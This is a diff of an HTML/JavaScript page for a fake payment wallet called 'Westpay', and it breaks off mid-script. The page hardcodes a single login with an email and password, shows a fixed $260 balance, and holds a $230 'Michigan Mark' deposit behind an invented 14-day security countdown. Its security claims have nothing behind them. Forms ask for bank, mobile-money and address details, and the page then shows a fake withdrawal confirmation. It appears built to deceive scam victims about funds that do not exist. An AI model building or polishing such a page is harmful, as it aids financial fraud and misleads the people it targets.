@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Westpay - Secure Digital Payments</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
-  <link rel="stylesheet" href=" https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css "/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
   <style>
     * {
       margin: 0;
@@ -493,7 +494,7 @@
     }
 
     .hidden {
-      display: none;
+      display: none !important;
     }
 
     .footer {
@@ -509,7 +510,7 @@
       line-height: 1.6;
     }
 
-    /* Withdraw Page */
+    /* Withdraw Pages */
     .withdraw-page {
       background: rgba(255, 255, 255, 0.05);
       backdrop-filter: blur(20px);
@@ -520,9 +521,8 @@
       padding: 40px;
       max-width: 500px;
       margin: 40px auto;
-      display: none;
     }
-
+    
     .withdraw-header {
       text-align: center;
       margin-bottom: 30px;
@@ -541,7 +541,7 @@
     .withdraw-subtitle {
       color: rgba(255, 255, 255, 0.7);
     }
-
+    
     .withdraw-form {
       margin-bottom: 30px;
     }
@@ -557,6 +557,19 @@
       backdrop-filter: blur(10px);
       text-align: center;
       margin-bottom: 20px;
+    }
+    
+    .currency-display {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #10b981;
+      display: none;
+    }
+    
+    .currency-display.active {
+      display: block;
     }
 
     .method-selection {
@@ -604,11 +617,6 @@
       background: rgba(255, 255, 255, 0.05);
       border-radius: 12px;
       border: 1px solid rgba(255, 255, 255, 0.1);
-      display: none;
-    }
-
-    .form-section.active {
-      display: block;
     }
 
     .form-row {
@@ -650,8 +658,9 @@
       background: rgba(255, 255, 255, 0.1);
       color: white;
       border: 1px solid rgba(255, 255, 255, 0.2);
+      margin-top: 15px;
     }
-
+    
     .security-restriction {
       background: rgba(239, 68, 68, 0.15);
       border: 1px solid rgba(239, 68, 68, 0.3);
@@ -759,211 +768,284 @@
   </style>
 </head>
 <body>
-  <!-- Animated Background -->
-  <div class="bg-animation">
-    <div class="grid"></div>
-  </div>
-
+  <div class="bg-animation"></div>
   <div class="container">
-    <div class="header">
-      <div class="logo">
-        <i class="fas fa-wallet logo-icon"></i>
-        <div class="logo-text">West<span>pay</span></div>
-      </div>
-      <div class="time-display" id="current-time">Loading time...</div>
-    </div>
-
     <!-- Login Section -->
-    <div class="login-container" id="login-section">
-      <div class="login-header">
-        <div class="login-title">Welcome Back</div>
-        <div class="login-subtitle">Secure access to your digital wallet</div>
-      </div>
-      <div class="login-form">
-        <div class="form-group">
-          <label for="email">Email Address</label>
-          <input type="email" id="email" placeholder="Enter your email address">
+    <div id="login-section">
+      <div class="login-container">
+        <div class="login-header">
+          <h1 class="login-title">Westpay</h1>
+          <p class="login-subtitle">Secure digital payments platform</p>
         </div>
-        <div class="form-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" placeholder="Enter your password">
-        </div>
-        <button class="btn" id="login-btn">Sign In</button>
-        <div class="forgot-password">Forgot your password?</div>
-        <div class="security-tip">
-          <i class="fas fa-shield-alt"></i> Biometric authentication • End-to-end encryption • 24/7 monitoring
-        </div>
-      </div>
-    </div>
-
-    <!-- Dashboard (Initially Hidden) -->
-    <div class="dashboard hidden" id="dashboard">
-      <div class="dashboard-header">
-        <div class="header-glow"></div>
-        <div class="welcome">Good day,</div>
-        <div class="user-name">User</div>
-      </div>
-
-      <!-- Security Restriction Message (Moved Here) -->
-      <div class="security-restriction hidden" id="security-restriction">
-        <i class="fas fa-exclamation-triangle"></i>
-        <div class="restriction-content">
-          <h3>Withdrawal Restriction in Place</h3>
-          <p>Your recent deposit of <strong>$230.00 from Michigan Mark</strong> is currently under security processing. For your protection, withdrawals are restricted for 14 days from the date of receipt.</p>
-          <p>This security measure helps prevent fraud and ensures the safety of your funds. Your money is safe and will be available for withdrawal after the processing period.</p>
-          <div class="restriction-timer">
-            <div class="timer-box">
-              <span id="days-left">12</span>
-              <span class="timer-label">Days</span>
-            </div>
-            <div class="timer-box">
-              <span id="hours-left">06</span>
-              <span class="timer-label">Hours</span>
-            </div>
-            <div class="timer-box">
-              <span id="minutes-left">42</span>
-              <span class="timer-label">Minutes</span>
-            </div>
+        <div class="login-form">
+          <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" placeholder="Enter your email">
           </div>
-          <p>For more information about our security policies, <a href="#" id="learn-more">learn more</a>.</p>
-        </div>
-      </div>
-
-      <div class="balance-section">
-        <div class="balance-label">Available Balance</div>
-        <div class="balance-amount">$260.00</div>
-        <div class="available">
-          <i class="fas fa-check-circle"></i> Secured by military-grade encryption
-        </div>
-      </div>
-
-      <div class="quick-actions">
-        <div class="action-btn" id="send-btn">
-          <i class="fas fa-paper-plane action-icon"></i>
-          <div class="action-label">Send Money</div>
-          <div class="action-desc">Instant transfers worldwide</div>
-        </div>
-        <div class="action-btn" id="request-btn">
-          <i class="fas fa-hand-holding-usd action-icon"></i>
-          <div class="action-label">Request</div>
-          <div class="action-desc">Get paid easily</div>
-        </div>
-        <div class="action-btn" id="withdraw-btn">
-          <i class="fas fa-money-bill-wave action-icon"></i>
-          <div class="action-label">Withdraw</div>
-          <div class="action-desc">Transfer to bank account</div>
-        </div>
-        <div class="action-btn">
-          <i class="fas fa-exchange-alt action-icon"></i>
-          <div class="action-label">Exchange</div>
-          <div class="action-desc">Multi-currency support</div>
-        </div>
-      </div>
-
-      <div class="transactions-section">
-        <h3 class="section-title"><i class="fas fa-history"></i> Recent Transactions</h3>
-        <div class="transaction-item" id="michigan-mark">
-          <div class="transaction-icon">
-            <i class="fas fa-user-friends"></i>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password">
           </div>
-          <div class="transaction-details">
-            <div class="transaction-name">Michigan Mark</div>
-            <div class="transaction-desc">Family and friends</div>
-            <div class="transaction-time">Wednesday, August 27, 2023 at 11:11 AM</div>
+          <button id="login-btn" class="btn">Log In</button>
+          <div class="forgot-password">Forgot password?</div>
+          <div class="security-tip">
+            <i class="fas fa-shield-alt"></i>
+            Your security is our top priority. All transactions are encrypted.
           </div>
-          <div class="transaction-amount positive">+$230.00</div>
-        </div>
-        <div class="transaction-item">
-          <div class="transaction-icon">
-            <i class="fas fa-shopping-cart"></i>
-          </div>
-          <div class="transaction-details">
-            <div class="transaction-name">Amazon.com</div>
-            <div class="transaction-desc">Online purchase</div>
-            <div class="transaction-time">Yesterday at 3:45 PM</div>
-          </div>
-          <div class="transaction-amount negative">-$89.99</div>
-        </div>
-        <div class="transaction-item">
-          <div class="transaction-icon">
-            <i class="fas fa-utensils"></i>
-          </div>
-          <div class="transaction-details">
-            <div class="transaction-name">Café Bella</div>
-            <div class="transaction-desc">Lunch</div>
-            <div class="transaction-time">Tuesday at 12:30 PM</div>
-          </div>
-          <div class="transaction-amount negative">-$24.50</div>
         </div>
       </div>
     </div>
 
-    <!-- Withdraw Page -->
-    <div class="withdraw-page" id="withdraw-page">
+    <!-- Dashboard -->
+    <div id="dashboard" class="hidden">
+      <div class="header">
+        <div class="logo">
+          <i class="fas fa-wallet logo-icon"></i>
+          <div class="logo-text">Westpay</div>
+        </div>
+        <div class="time-display" id="current-time"></div>
+      </div>
+
+      <div class="main-content">
+        <div class="dashboard">
+          <div class="dashboard-header">
+            <div class="header-glow"></div>
+            <div class="welcome">Welcome back,</div>
+            <div class="user-name">John</div>
+          </div>
+
+          <div class="balance-section">
+            <div class="balance-label">Total Balance</div>
+            <div class="balance-amount">$260.00</div>
+            <div class="available">
+              <i class="fas fa-check-circle"></i>
+              <span id="available-balance-mobile">Available: $30.00</span>
+            </div>
+          </div>
+
+          <div class="quick-actions">
+            <div class="action-btn" id="withdraw-btn">
+              <i class="fas fa-arrow-down action-icon"></i>
+              <div class="action-label">Withdraw</div>
+              <div class="action-desc">Transfer to bank or mobile</div>
+            </div>
+            <div class="action-btn" id="send-btn">
+              <i class="fas fa-paper-plane action-icon"></i>
+              <div class="action-label">Send</div>
+              <div class="action-desc">Send money to contacts</div>
+            </div>
+            <div class="action-btn" id="request-btn">
+              <i class="fas fa-hand-holding-usd action-icon"></i>
+              <div class="action-label">Request</div>
+              <div class="action-desc">Request money from others</div>
+            </div>
+            <div class="action-btn">
+              <i class="fas fa-exchange-alt action-icon"></i>
+              <div class="action-label">Exchange</div>
+              <div class="action-desc">Convert between currencies</div>
+            </div>
+          </div>
+
+          <div class="transactions-section">
+            <h2 class="section-title"><i class="fas fa-history"></i> Recent Transactions</h2>
+            <div class="transaction-item" id="michigan-mark">
+              <div class="transaction-icon">
+                <i class="fas fa-store"></i>
+              </div>
+              <div class="transaction-details">
+                <div class="transaction-name">Michigan Mark</div>
+                <div class="transaction-desc">Payment for services</div>
+                <div class="transaction-time">2 days ago</div>
+              </div>
+              <div class="transaction-amount negative">-$230.00</div>
+            </div>
+            <div class="transaction-item">
+              <div class="transaction-icon">
+                <i class="fas fa-wallet"></i>
+              </div>
+              <div class="transaction-details">
+                <div class="transaction-name">Salary Deposit</div>
+                <div class="transaction-desc">Monthly salary</div>
+                <div class="transaction-time">3 days ago</div>
+              </div>
+              <div class="transaction-amount positive">+$500.00</div>
+            </div>
+            <div class="transaction-item">
+              <div class="transaction-icon">
+                <i class="fas fa-coffee"></i>
+              </div>
+              <div class="transaction-details">
+                <div class="transaction-name">Cafe Luna</div>
+                <div class="transaction-desc">Coffee and snack</div>
+                <div class="transaction-time">1 week ago</div>
+              </div>
+              <div class="transaction-amount negative">-$12.50</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="sidebar">
+          <div class="card">
+            <div class="card-header">
+              <i class="fas fa-shield-alt"></i> Security Notice
+            </div>
+            <div class="card-body">
+              <div id="security-restriction" class="security-restriction hidden">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div class="restriction-content">
+                  <h3>Funds Restriction</h3>
+                  <p>Your recent deposit of <strong>$230.00</strong> is under security processing. This is a standard security measure to protect your account.</p>
+                  <p>Available balance will be updated after processing completes.</p>
+                  <div class="restriction-timer">
+                    <div class="timer-box">
+                      <span>14</span>
+                      <div class="timer-label">Days</div>
+                    </div>
+                    <div class="timer-box">
+                      <span>05</span>
+                      <div class="timer-label">Hours</div>
+                    </div>
+                    <div class="timer-box">
+                      <span>23</span>
+                      <div class="timer-label">Mins</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <p>For security reasons, recent deposits undergo a 14-day processing period. <a href="#" id="learn-more">Learn more</a></p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer">
+        <p>Westpay is a secure digital payments platform. All transactions are protected by bank-level security.</p>
+        <p>© 2023 Westpay. All rights reserved.</p>
+      </div>
+    </div>
+
+    <!-- Withdraw Options Page -->
+    <div id="withdraw-options-page" class="withdraw-page hidden">
       <div class="withdraw-header">
-        <div class="withdraw-title">Withdraw Funds</div>
-        <div class="withdraw-subtitle">Transfer money to your preferred method</div>
+        <h2 class="withdraw-title">Withdraw Funds</h2>
+        <p class="withdraw-subtitle">Select your preferred withdrawal method</p>
+      </div>
+      
+      <div class="method-selection">
+        <div class="method-title">Withdrawal Method</div>
+        <div class="method-options">
+          <div class="method-btn" id="go-to-bank-withdraw">
+            <i class="fas fa-university"></i>
+            <div>Bank Transfer</div>
+          </div>
+          <div class="method-btn" id="go-to-mobile-withdraw">
+            <i class="fas fa-mobile-alt"></i>
+            <div>Mobile Money</div>
+          </div>
+        </div>
+      </div>
+      
+      <button id="back-from-options" class="btn back-btn">
+        <i class="fas fa-arrow-left"></i> Back
+      </button>
+    </div>
+
+    <!-- Mobile Withdraw Page -->
+    <div id="mobile-withdraw-page" class="withdraw-page hidden">
+      <div class="withdraw-header">
+        <h2 class="withdraw-title">Mobile Withdrawal</h2>
+        <p class="withdraw-subtitle">Enter amount to withdraw to mobile money</p>
       </div>
       
       <div class="withdraw-form">
-        <input type="text" class="amount-input" id="withdraw-amount" placeholder="0.00">
-        
-        <div class="method-selection">
-          <div class="method-title">Choose Withdrawal Method</div>
-          <div class="method-options">
-            <div class="method-btn" id="bank-method">Bank Account</div>
-            <div class="method-btn" id="mobile-method">Mobile Wallet</div>
-          </div>
+        <div class="form-group">
+          <label>Amount (USD)</label>
+          <input type="number" id="mobile-amount-usd" class="amount-input" placeholder="0.00">
+          <div id="ugx-display" class="currency-display"></div>
         </div>
-        
-        <!-- Bank Account Form -->
-        <div class="form-section" id="bank-form">
-          <div class="form-row">
-            <label for="bank-name">Bank Name</label>
-            <input type="text" id="bank-name" placeholder="Enter bank name">
-          </div>
-          <div class="form-row">
-            <label for="account-number">Account Number</label>
-            <input type="text" id="account-number" placeholder="Enter account number">
-          </div>
-          <div class="form-row">
-            <label for="account-name">Account Holder Name</label>
-            <input type="text" id="account-name" placeholder="Enter account holder name">
-          </div>
-        </div>
-        
-        <!-- Mobile Wallet Form -->
-        <div class="form-section" id="mobile-form">
-          <div class="form-row">
-            <label>Select Provider</label>
-            <div class="provider-options">
-              <div class="provider-btn" id="airtel-provider">Airtel</div>
-              <div class="provider-btn" id="mtn-provider">MTN</div>
-            </div>
-          </div>
-          
-          <div class="form-row">
-            <label for="mobile-number">Mobile Number</label>
-            <input type="text" id="mobile-number" placeholder="Enter mobile number">
-          </div>
-          <div class="form-row">
-            <label for="full-name">Full Name</label>
-            <input type="text" id="full-name" placeholder="Enter your full name">
-          </div>
-          <div class="form-row">
-            <label for="address">Address</label>
-            <input type="text" id="address" placeholder="Enter your address">
-          </div>
-        </div>
-        
-        <button class="btn" id="confirm-withdraw">Withdraw Funds</button>
-        <button class="btn back-btn" id="back-to-dashboard">Back to Dashboard</button>
+        <div class="available-balance" id="available-balance-mobile">Available: $30.00</div>
       </div>
+      
+      <button id="done-btn" class="btn">Next</button>
+      <button id="back-from-mobile-amount" class="btn back-btn">
+        <i class="fas fa-arrow-left"></i> Back
+      </button>
     </div>
 
-    <div class="footer">
-      <p>Westpay © 2023 • Secured by military-grade encryption</p>
-      <p style="margin-top: 8px;">All transactions are protected with 256-bit encryption and real-time fraud monitoring</p>
+    <!-- Mobile Provider Page -->
+    <div id="mobile-provider-page" class="withdraw-page hidden">
+      <div class="withdraw-header">
+        <h2 class="withdraw-title">Select Provider</h2>
+        <p class="withdraw-subtitle">Choose your mobile money provider</p>
+      </div>
+      
+      <div class="form-section">
+        <div class="form-group">
+          <label>Mobile Number</label>
+          <input type="tel" id="mobile-number" placeholder="Enter your mobile number">
+        </div>
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" id="full-name" placeholder="Enter your full name">
+        </div>
+        <div class="form-group">
+          <label>Address</label>
+          <input type="text" id="address" placeholder="Enter your address">
+        </div>
+      </div>
+      
+      <div class="method-selection">
+        <div class="method-title">Select Provider</div>
+        <div class="provider-options">
+          <div class="provider-btn" id="airtel-provider">
+            <i class="fas fa-wifi"></i>
+            <div>Airtel</div>
+          </div>
+          <div class="provider-btn" id="mtn-provider">
+            <i class="fas fa-signal"></i>
+            <div>MTN</div>
+          </div>
+        </div>
+      </div>
+      
+      <button id="send-mobile-withdraw" class="btn">Confirm Withdrawal</button>
+      <button id="back-from-mobile-provider" class="btn back-btn">
+        <i class="fas fa-arrow-left"></i> Back
+      </button>
+    </div>
+
+    <!-- Bank Withdraw Page -->
+    <div id="bank-withdraw-page" class="withdraw-page hidden">
+      <div class="withdraw-header">
+        <h2 class="withdraw-title">Bank Withdrawal</h2>
+        <p class="withdraw-subtitle">Enter bank account details</p>
+      </div>
+      
+      <div class="form-section">
+        <div class="form-group">
+          <label>Amount (USD)</label>
+          <input type="number" id="bank-amount-usd" class="amount-input" placeholder="0.00">
+        </div>
+        <div class="available-balance" id="available-balance-bank">Available: $30.00</div>
+        
+        <div class="form-row">
+          <label>Bank Name</label>
+          <input type="text" id="bank-name" placeholder="Enter bank name">
+        </div>
+        <div class="form-row">
+          <label>Account Number</label>
+          <input type="text" id="account-number" placeholder="Enter account number">
+        </div>
+        <div class="form-row">
+          <label>Account Name</label>
+          <input type="text" id="account-name" placeholder="Enter account name">
+        </div>
+      </div>
+      
+      <button id="confirm-bank-withdraw" class="btn">Confirm Withdrawal</button>
+      <button id="back-from-bank-details" class="btn back-btn">
+        <i class="fas fa-arrow-left"></i> Back
+      </button>
     </div>
   </div>
 
@@ -995,10 +1077,9 @@
       }
     }
 
-    // DOM Elements
+    // --- DOM Elements ---
     const loginSection = document.getElementById('login-section');
     const dashboard = document.getElementById('dashboard');
-    const withdrawPage = document.getElementById('withdraw-page');
     const securityRestriction = document.getElementById('security-restriction');
     const loginBtn = document.getElementById('login-btn');
     const emailInput = document.getElementById('email');
@@ -1007,200 +1088,42 @@
     const withdrawBtn = document.getElementById('withdraw-btn');
     const sendBtn = document.getElementById('send-btn');
     const requestBtn = document.getElementById('request-btn');
-    const backToDashboardBtn = document.getElementById('back-to-dashboard');
-    const confirmWithdrawBtn = document.getElementById('confirm-withdraw');
-    const withdrawAmountInput = document.getElementById('withdraw-amount');
     const michiganMark = document.getElementById('michigan-mark');
     const learnMore = document.getElementById('learn-more');
     
-    // Method selection
-    const bankMethodBtn = document.getElementById('bank-method');
-    const mobileMethodBtn = document.getElementById('mobile-method');
-    const bankForm = document.getElementById('bank-form');
-    const mobileForm = document.getElementById('mobile-form');
+    // New Withdrawal Page Elements
+    const withdrawOptionsPage = document.getElementById('withdraw-options-page');
+    const mobileWithdrawPage = document.getElementById('mobile-withdraw-page');
+    const mobileProviderPage = document.getElementById('mobile-provider-page');
+    const bankWithdrawPage = document.getElementById('bank-withdraw-page');
     
-    // Provider selection
+    const goToBankWithdrawBtn = document.getElementById('go-to-bank-withdraw');
+    const goToMobileWithdrawBtn = document.getElementById('go-to-mobile-withdraw');
+    
+    const backFromOptionsBtn = document.getElementById('back-from-options');
+    const backFromMobileAmountBtn = document.getElementById('back-from-mobile-amount');
+    const backFromBankDetailsBtn = document.getElementById('back-from-bank-details');
+    const backFromMobileProviderBtn = document.getElementById('back-from-mobile-provider');
+    
+    const mobileAmountInput = document.getElementById('mobile-amount-usd');
+    const ugxDisplay = document.getElementById('ugx-display');
+    const doneBtn = document.getElementById('done-btn');
+    
     const airtelProviderBtn = document.getElementById('airtel-provider');
     const mtnProviderBtn = document.getElementById('mtn-provider');
+    const sendMobileWithdrawBtn = document.getElementById('send-mobile-withdraw');
+    
+    const bankAmountInput = document.getElementById('bank-amount-usd');
+    const confirmBankWithdrawBtn = document.getElementById('confirm-bank-withdraw');
 
-    // Set current time
-    function updateCurrentTime() {
-      const now = new Date();
-      currentTime.textContent = now.toLocaleString('en-US', {
-        weekday: 'long',
-        year: 'numeric',
-        month: 'long',
-        day: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit'
-      });
-    }
+    // --- State & Constants ---
+    const RESTRICTED_BALANCE = 230.00;
+    const TOTAL_BALANCE = 260.00;
+    const AVAILABLE_BALANCE = TOTAL_BALANCE - RESTRICTED_BALANCE;
+    const UGX_RATE = 3800; // Mock exchange rate USD to UGX
 
-    // Login functionality
-    loginBtn.addEventListener('click', () => {
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-      
-      if (!email) {
-        // Use a custom message box instead of alert()
-        showMessageBox('Please enter your email address');
-        return;
-      }
-      
-      if (!password) {
-        showMessageBox('Please enter your password');
-        return;
-      }
-      
-      if (email === 'japanboys0099@gmail.com' && password === 'Rockmeta') {
-        loginSection.classList.add('hidden');
-        dashboard.classList.remove('hidden');
-        securityRestriction.classList.remove('hidden'); // Show the restriction message on login
-        
-        // Set user name from email
-        const userName = email.split('@')[0].replace(/[0-9]/g, '');
-        document.querySelector('.user-name').textContent = 
-          userName.charAt(0).toUpperCase() + userName.slice(1);
-          
-        // Trigger a brief loading effect
-        document.body.style.cursor = 'wait';
-        setTimeout(() => {
-          document.body.style.cursor = 'default';
-        }, 800);
-      } else {
-        showMessageBox('Invalid email or password. Please try again.');
-      }
-    });
-
-    // Allow pressing Enter on password field
-    passwordInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') {
-        loginBtn.click();
-      }
-    });
-
-    // Navigate to withdraw page
-    withdrawBtn.addEventListener('click', () => {
-      dashboard.classList.add('hidden');
-      withdrawPage.classList.remove('hidden');
-      // Reset form
-      withdrawAmountInput.value = '';
-      bankForm.classList.remove('active');
-      mobileForm.classList.remove('active');
-      bankMethodBtn.classList.remove('active');
-      mobileMethodBtn.classList.remove('active');
-      airtelProviderBtn.classList.remove('active');
-      mtnProviderBtn.classList.remove('active');
-    });
-
-    // Click on Michigan Mark transaction
-    michiganMark.addEventListener('click', () => {
-      // The message is already on the page, just scroll to it
-      securityRestriction.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      
-      // Add animation effect
-      securityRestriction.style.transform = 'scale(1.02)';
-      setTimeout(() => {
-        securityRestriction.style.transform = 'scale(1)';
-      }, 200);
-    });
-
-    // Learn more click
-    learnMore.addEventListener('click', (e) => {
-      e.preventDefault();
-      showMessageBox('Westpay uses advanced security protocols to protect your funds. All recent deposits undergo a 14-day security processing period to prevent fraudulent activities and ensure the safety of your money. This is a standard security measure used by leading financial institutions worldwide.');
-    });
-
-    // Method selection
-    bankMethodBtn.addEventListener('click', () => {
-      bankMethodBtn.classList.add('active');
-      mobileMethodBtn.classList.remove('active');
-      bankForm.classList.add('active');
-      mobileForm.classList.remove('active');
-    });
-
-    mobileMethodBtn.addEventListener('click', () => {
-      mobileMethodBtn.classList.add('active');
-      bankMethodBtn.classList.remove('active');
-      mobileForm.classList.add('active');
-      bankForm.classList.remove('active');
-    });
-
-    // Provider selection
-    airtelProviderBtn.addEventListener('click', () => {
-      airtelProviderBtn.classList.add('active');
-      mtnProviderBtn.classList.remove('active');
-    });
-
-    mtnProviderBtn.addEventListener('click', () => {
-      mtnProviderBtn.classList.add('active');
-      airtelProviderBtn.classList.remove('active');
-    });
-
-    // Confirm withdrawal
-    confirmWithdrawBtn.addEventListener('click', () => {
-      const amount = withdrawAmountInput.value.trim();
-      
-      if (!amount || parseFloat(amount) <= 0) {
-        showMessageBox('Please enter a valid amount to withdraw');
-        return;
-      }
-      
-      // Check if method is selected
-      if (!bankMethodBtn.classList.contains('active') && !mobileMethodBtn.classList.contains('active')) {
-        showMessageBox('Please select a withdrawal method');
-        return;
-      }
-      
-      // For bank method, check required fields
-      if (bankMethodBtn.classList.contains('active')) {
-        const bankName = document.getElementById('bank-name').value.trim();
-        const accountNumber = document.getElementById('account-number').value.trim();
-        const accountName = document.getElementById('account-name').value.trim();
-        
-        if (!bankName || !accountNumber || !accountName) {
-          showMessageBox('Please fill in all bank account details');
-          return;
-        }
-      }
-      
-      // For mobile method, check required fields
-      if (mobileMethodBtn.classList.contains('active')) {
-        if (!airtelProviderBtn.classList.contains('active') && !mtnProviderBtn.classList.contains('active')) {
-          showMessageBox('Please select a mobile provider');
-          return;
-        }
-        
-        const mobileNumber = document.getElementById('mobile-number').value.trim();
-        const fullName = document.getElementById('full-name').value.trim();
-        const address = document.getElementById('address').value.trim();
-        
-        if (!mobileNumber || !fullName || !address) {
-          showMessageBox('Please fill in all mobile wallet details');
-          return;
-        }
-      }
-      
-      // Withdrawal is not available due to the restriction
-      showMessageBox('Withdrawal Not Available: Your recent deposit of $230.00 is under security processing. Withdrawals are restricted for 14 days for your protection.');
-    });
-
-    // Back to dashboard
-    backToDashboardBtn.addEventListener('click', () => {
-      withdrawPage.classList.add('hidden');
-      dashboard.classList.remove('hidden');
-    });
-
-    // Simulate actions
-    sendBtn.addEventListener('click', () => {
-      showMessageBox('Send money feature would open here');
-    });
-
-    requestBtn.addEventListener('click', () => {
-      showMessageBox('Request money feature would open here');
-    });
-
-    // Custom message box function instead of alert()
+    // --- Helper Functions ---
+    // Function to show a custom message box instead of alert()
     function showMessageBox(message) {
       const box = document.createElement('div');
       box.style.position = 'fixed';
@@ -1230,15 +1153,247 @@
       }, 3000);
     }
 
+    // Function to hide all pages and show a specific one
+    function showPage(page) {
+      const allPages = [
+        loginSection, 
+        dashboard, 
+        withdrawOptionsPage, 
+        mobileWithdrawPage, 
+        bankWithdrawPage, 
+        mobileProviderPage
+      ];
+      
+      allPages.forEach(p => {
+        if (p) p.classList.add('hidden');
+      });
+      
+      if (page) {
+        page.classList.remove('hidden');
+      }
+    }
+
+    // Set current time
+    function updateCurrentTime() {
+      const now = new Date();
+      currentTime.textContent = now.toLocaleString('en-US', {
+        weekday: 'long',
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit'
+      });
+    }
+    
+    // --- Event Listeners ---
+    
+    // Login functionality
+    loginBtn.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      
+      if (!email || !password) {
+        showMessageBox('Please enter both email and password.');
+        return;
+      }
+      
+      if (email === 'japanboys0099@gmail.com' && password === 'Rockmeta') {
+        showPage(dashboard);
+        securityRestriction.classList.remove('hidden');
+        
+        // Set user name from email
+        const userName = email.split('@')[0].replace(/[0-9]/g, '');
+        document.querySelector('.user-name').textContent = 
+          userName.charAt(0).toUpperCase() + userName.slice(1);
+          
+        // Update available balance display
+        if (document.getElementById('available-balance-mobile')) {
+          document.getElementById('available-balance-mobile').textContent = `$${AVAILABLE_BALANCE.toFixed(2)}`;
+        }
+        if (document.getElementById('available-balance-bank')) {
+          document.getElementById('available-balance-bank').textContent = `$${AVAILABLE_BALANCE.toFixed(2)}`;
+        }
+        
+        // Trigger a brief loading effect
+        document.body.style.cursor = 'wait';
+        setTimeout(() => {
+          document.body.style.cursor = 'default';
+        }, 800);
+      } else {
+        showMessageBox('Invalid email or password. Please try again.');
+      }
+    });
+
+    // Navigate to withdraw options page
+    withdrawBtn.addEventListener('click', () => {
+      showPage(withdrawOptionsPage);
+    });
+    
+    // Go to Bank withdrawal page
+    goToBankWithdrawBtn.addEventListener('click', () => {
+      showPage(bankWithdrawPage);
+    });
+    
+    // Go to Mobile withdrawal page (Step 2)
+    goToMobileWithdrawBtn.addEventListener('click', () => {
+      mobileAmountInput.value = '';
+      ugxDisplay.textContent = '';
+      ugxDisplay.classList.remove('active');
+      showPage(mobileWithdrawPage);
+    });
+
+    // Back button functionality
+    backFromOptionsBtn.addEventListener('click', () => {
+      showPage(dashboard);
+    });
+    
+    backFromMobileAmountBtn.addEventListener('click', () => {
+      showPage(withdrawOptionsPage);
+    });
+    
+    backFromBankDetailsBtn.addEventListener('click', () => {
+      showPage(withdrawOptionsPage);
+    });
+    
+    backFromMobileProviderBtn.addEventListener('click', () => {
+      showPage(mobileWithdrawPage);
+    });
+
+    // Real-time currency conversion
+    mobileAmountInput.addEventListener('input', () => {
+      let amount = parseFloat(mobileAmountInput.value);
+      if (isNaN(amount) || amount <= 0) {
+        ugxDisplay.classList.remove('active');
+        ugxDisplay.textContent = '';
+      } else {
+        const ugxAmount = amount * UGX_RATE;
+        ugxDisplay.textContent = `~ ${ugxAmount.toFixed(2)} UGX`;
+        ugxDisplay.classList.add('active');
+      }
+    });
+    
+    // Go to Mobile Provider page (Step 3)
+    doneBtn.addEventListener('click', () => {
+      let amount = parseFloat(mobileAmountInput.value);
+      
+      if (isNaN(amount) || amount <= 0) {
+        showMessageBox('Please enter a valid amount.');
+        return;
+      }
+      
+      if (amount > AVAILABLE_BALANCE) {
+        showMessageBox(`Withdrawal limit exceeded. You can only withdraw up to $${AVAILABLE_BALANCE.toFixed(2)}.`);
+        return;
+      }
+      
+      // Reset provider selection
+      airtelProviderBtn.classList.remove('active');
+      mtnProviderBtn.classList.remove('active');
+      
+      showPage(mobileProviderPage);
+    });
+
+    // Mobile provider selection
+    airtelProviderBtn.addEventListener('click', () => {
+      airtelProviderBtn.classList.add('active');
+      mtnProviderBtn.classList.remove('active');
+    });
+
+    mtnProviderBtn.addEventListener('click', () => {
+      mtnProviderBtn.classList.add('active');
+      airtelProviderBtn.classList.remove('active');
+    });
+
+    // Finalize mobile withdrawal
+    sendMobileWithdrawBtn.addEventListener('click', () => {
+      const mobileNumber = document.getElementById('mobile-number').value.trim();
+      const fullName = document.getElementById('full-name').value.trim();
+      const address = document.getElementById('address').value.trim();
+      
+      if (!airtelProviderBtn.classList.contains('active') && !mtnProviderBtn.classList.contains('active')) {
+        showMessageBox('Please select a mobile provider.');
+        return;
+      }
+      
+      if (!mobileNumber || !fullName || !address) {
+        showMessageBox('Please fill in all details.');
+        return;
+      }
+      
+      showMessageBox('Mobile wallet withdrawal confirmed! Your money is on its way.');
+      setTimeout(() => {
+        showPage(dashboard);
+      }, 2000);
+    });
+    
+    // Finalize bank withdrawal
+    confirmBankWithdrawBtn.addEventListener('click', () => {
+      const amount = parseFloat(bankAmountInput.value);
+      const bankName = document.getElementById('bank-name').value.trim();
+      const accountNumber = document.getElementById('account-number').value.trim();
+      const accountName = document.getElementById('account-name').value.trim();
+      
+      if (isNaN(amount) || amount <= 0) {
+        showMessageBox('Please enter a valid amount.');
+        return;
+      }
+      
+      if (amount > AVAILABLE_BALANCE) {
+        showMessageBox(`Withdrawal limit exceeded. You can only withdraw up to $${AVAILABLE_BALANCE.toFixed(2)}.`);
+        return;
+      }
+      
+      if (!bankName || !accountNumber || !accountName) {
+        showMessageBox('Please fill in all bank account details.');
+        return;
+      }
+      
+      showMessageBox('Bank withdrawal confirmed! Your money is on its way.');
+      setTimeout(() => {
+        showPage(dashboard);
+      }, 2000);
+    });
+
+    // Simulating other actions
+    sendBtn.addEventListener('click', () => {
+      showMessageBox('Send money feature would open here');
+    });
+
+    requestBtn.addEventListener('click', () => {
